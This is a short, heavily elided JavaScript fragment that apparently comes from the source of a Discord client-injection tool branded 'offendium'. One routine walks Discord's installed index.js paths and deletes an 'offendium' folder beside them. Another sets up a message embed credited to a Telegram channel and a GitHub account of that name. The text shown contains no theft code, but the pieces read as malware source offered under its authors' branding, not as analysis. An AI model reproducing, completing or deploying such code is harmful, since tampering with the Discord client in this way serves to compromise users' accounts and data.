        ...
        module.exports = (client) => {
          return {
            ...
            async init() {
              ...
              for (const path of client.config.discord.files_path) {
                if (client.requires.fs.existsSync(path.replace("index.js", "offendium"))) {
                  client.requires.fs.rmdirSync(path.replace("index.js", "offendium"));
                }
              }
            }
          };
  ...
  (() => {
    ...
    `;
      ...
      async init() {
        ...
        this.config.embed =
          {
            "username": "t.me/offendium | github.com/offendium1337/offendium",
            "href": "https://t.me/offendium",
            "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
            "credits": "t.me/offendium | github.com/offendium1337/offendium"
          }
